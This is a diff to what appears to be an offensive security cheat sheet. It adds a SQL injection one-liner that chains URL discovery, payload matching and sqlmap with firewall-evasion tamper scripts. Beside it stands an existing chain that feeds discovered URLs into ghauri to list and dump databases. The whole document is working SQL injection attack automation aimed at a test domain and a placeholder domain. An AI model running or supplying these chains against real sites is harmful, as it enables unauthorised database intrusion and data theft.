@@ -1,3 +1,7 @@
+### SQLI
+```
+urlfinder -d "vulnweb.com" -all| iconv -f ISO-8859-1 -t UTF-8 | match -r "*" -m ~/payloads/sqli.txt | anew | httpx -duc | tee sqli.txt; sqlmap -m sqli.txt --batch --current-db --random-agent --tech=EBT --tamper=space2comment,xforwardedfor,symboliclogical,between,charunicodeencode
+```
 ### SQLi All
 ```
 urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --random-agent --confirm --force-ssl --level=3 --dbs --dump --batch
